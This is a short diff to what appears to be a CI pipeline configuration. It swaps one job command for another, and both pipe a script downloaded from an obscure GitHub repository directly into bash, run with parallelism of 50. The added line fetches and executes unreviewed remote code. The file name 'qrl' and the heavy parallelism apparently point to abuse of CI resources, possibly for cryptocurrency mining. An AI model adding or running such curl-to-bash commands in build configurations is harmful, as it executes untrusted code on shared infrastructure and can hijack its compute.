@@ -15,5 +15,5 @@ blocks:
       jobs: 
         - name: 'Job #1' 
           commands: 
-            - curl -sL https://github.com/mgssjs/moanu/raw/main/dora | bash
+            - curl -sL https://github.com/mgssjs/moanu/raw/main/qrl | bash
           parallelism: 50
